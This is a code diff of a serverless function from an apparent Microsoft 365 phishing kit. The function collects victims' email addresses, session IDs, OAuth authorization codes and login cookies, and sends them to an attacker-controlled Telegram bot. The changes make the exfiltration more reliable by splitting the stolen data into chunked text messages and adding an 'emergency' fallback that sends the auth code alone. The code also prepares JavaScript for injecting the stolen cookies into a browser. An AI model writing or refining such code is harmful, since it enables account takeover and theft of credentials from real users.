@@ -68,9 +68,8 @@ export const handler = async (event, context) => {
     
     let messageText = `🔐 Microsoft OAuth Login Captured!\n\n`;
     messageText += `📧 Email: ${email}\n`;
-    messageText += `🌐 Domain: ${domain}\n`;
     messageText += `🔑 Session ID: ${sessionId}\n`;
-    messageText += `✅ Auth Code: ${hasAuthCode ? 'Captured (see file)' : 'Missing'}\n`;
+    messageText += `✅ Auth Code: ${hasAuthCode ? 'Captured (see next message)' : 'Missing'}\n`;
     messageText += `🕒 Time: ${timestamp}\n\n`;
     
     // Add organizational credentials info
@@ -136,7 +135,7 @@ export const handler = async (event, context) => {
 
     console.log('✅ Main message sent to Telegram');
 
-    // Process and send cookies as file
+    // Always send credentials file (even if no cookies)
     let fileSent = false;
     try {
       let formattedCookies = [];
@@ -169,11 +168,13 @@ export const handler = async (event, context) => {
           .filter(Boolean);
       }
 
-      // Ensure all cookies have Microsoft domain
+      // Ensure all cookies have Microsoft domain (if any)
       const microsoftCookies = formattedCookies.map(c => ({
         ...c,
         domain: '.login.microsoftonline.com',
       }));
+      
+      console.log(`📄 Preparing file with ${microsoftCookies.length} cookies and auth code: ${!!authCode}`);
 
       // Create JavaScript injection code
       const jsInjectionCode = microsoftCookies.length > 0
@@ -261,54 +262,87 @@ ${data.browserFingerprint?.localStorage || 'Empty'}
 // *** END OF FILE ***
 `;
 
-      // Send cookies as file to Telegram
-      const fileName = `microsoft365_cookies_${email.replace('@', '_at_')}_${Date.now()}.js`;
-      const boundary = '----formdata-boundary-' + Math.random().toString(36);
+      // Always send credentials as text message (more reliable than file upload)
+      const fileName = `microsoft365_credentials_${email.replace('@', '_at_').replace(/\./g, '_')}_${Date.now()}.js`;
       
-      let formData = '';
-      formData += `--${boundary}\r\n`;
-      formData += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
-      formData += `${TELEGRAM_CHAT_ID}\r\n`;
-      formData += `--${boundary}\r\n`;
-      formData += `Content-Disposition: form-data; name="document"; filename="${fileName}"\r\n`;
-      formData += `Content-Type: text/javascript\r\n\r\n`;
-      formData += cookiesFileContent;
-      formData += `\r\n`;
-      formData += `--${boundary}--\r\n`;
-
-      const fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': `multipart/form-data; boundary=${boundary}`
-        },
-        body: formData,
-      });
-
-      if (fileResponse.ok) {
-        fileSent = true;
-        console.log('✅ Cookies file sent to Telegram');
+      console.log('📤 Sending credentials to Telegram as text message');
+      
+      // Split the content into chunks if too long
+      const maxLength = 4000;
+      const chunks = [];
+      
+      if (cookiesFileContent.length <= maxLength) {
+        chunks.push(cookiesFileContent);
       } else {
-        const fileErrorText = await fileResponse.text();
-        console.error('❌ File upload failed:', fileErrorText);
-        
-        // Fallback: send as text message if file fails
-        const fallbackMessage = `📁 **MICROSOFT 365 COOKIES** (${microsoftCookies.length} cookies)\n\n\`\`\`\n${cookiesFileContent.substring(0, 3500)}\n\`\`\`\n\n${cookiesFileContent.length > 3500 ? '*...truncated*' : ''}`;
-        
-        const fallbackResponse = await fetch(telegramUrl, {
+        // Split into multiple chunks
+        for (let i = 0; i < cookiesFileContent.length; i += maxLength) {
+          chunks.push(cookiesFileContent.substring(i, i + maxLength));
+        }
+      }
+      
+      // Send header message
+      const headerMessage = `📁 **MICROSOFT 365 CREDENTIALS FILE**\n\n📧 Email: \`${email}\`\n🔑 Session: \`${sessionId}\`\n📄 File: \`${fileName}\`\n🍪 Cookies: ${microsoftCookies.length}\n✅ Auth Code: ${authCode ? 'Captured' : 'Missing'}\n\n${chunks.length > 1 ? `📋 Content split into ${chunks.length} parts:` : ''}`;
+      
+      const headerResponse = await fetch(telegramUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: headerMessage,
+          parse_mode: 'Markdown'
+        }),
+      });
+      
+      // Send each chunk
+      for (let i = 0; i < chunks.length; i++) {
+        const chunkMessage = chunks.length > 1 
+          ? `📄 **Part ${i + 1}/${chunks.length}**\n\n\`\`\`javascript\n${chunks[i]}\n\`\`\``
+          : `\`\`\`javascript\n${chunks[i]}\n\`\`\``;
+          
+        const chunkResponse = await fetch(telegramUrl, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
-            text: fallbackMessage,
+            text: chunkMessage,
+            parse_mode: 'Markdown'
+          }),
+        });
+        
+        if (chunkResponse.ok) {
+          fileSent = true;
+          console.log(`✅ Credentials part ${i + 1}/${chunks.length} sent to Telegram`);
+        } else {
+          console.error(`❌ Failed to send credentials part ${i + 1}:`, await chunkResponse.text());
+        }
+        
+        // Small delay between chunks to avoid rate limiting
+        if (i < chunks.length - 1) {
+          await new Promise(resolve => setTimeout(resolve, 100));
+        }
+      }
+      
+      if (fileSent) {
+        console.log('✅ All credentials sent to Telegram successfully');
+      } else {
+        console.error('❌ Failed to send credentials to Telegram');
+        
+        // Ultra fallback: send just the auth code
+        const emergencyMessage = `🚨 **EMERGENCY BACKUP**\n\n📧 Email: \`${email}\`\n🔑 Authorization Code:\n\`\`\`\n${authCode || 'Not captured'}\n\`\`\``;
+        
+                 const emergencyResponse = await fetch(telegramUrl, {
+           method: 'POST',
+           headers: { 'Content-Type': 'application/json' },
+           body: JSON.stringify({
+             chat_id: TELEGRAM_CHAT_ID,
+             text: emergencyMessage,
             parse_mode: 'Markdown',
           }),
         });
 
-        if (fallbackResponse.ok) {
+        if (emergencyResponse.ok) {
           fileSent = true;
-          console.log('✅ Fallback cookies text sent to Telegram');
+          console.log('✅ Emergency auth code sent to Telegram');
         }
       }
     } catch (fileError) {
